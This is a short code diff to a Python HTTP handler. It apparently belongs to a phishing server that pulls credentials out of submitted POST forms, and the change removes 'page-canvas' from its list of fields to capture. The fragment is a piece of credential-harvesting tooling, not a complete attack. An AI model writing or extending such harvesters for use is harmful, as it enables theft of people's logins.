@@ -33,7 +33,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def getCredentials(self, values):
         post = values.decode('UTF-8')
         readpost = post.strip('&')
-        forms = ['email','user','login','pass','page-canvas'] #Possibles forms to get the credentials
+        forms = ['email','user','login','pass'] #Possibles forms to get the credentials
 
         try:
             readpost = readpost.split('&')
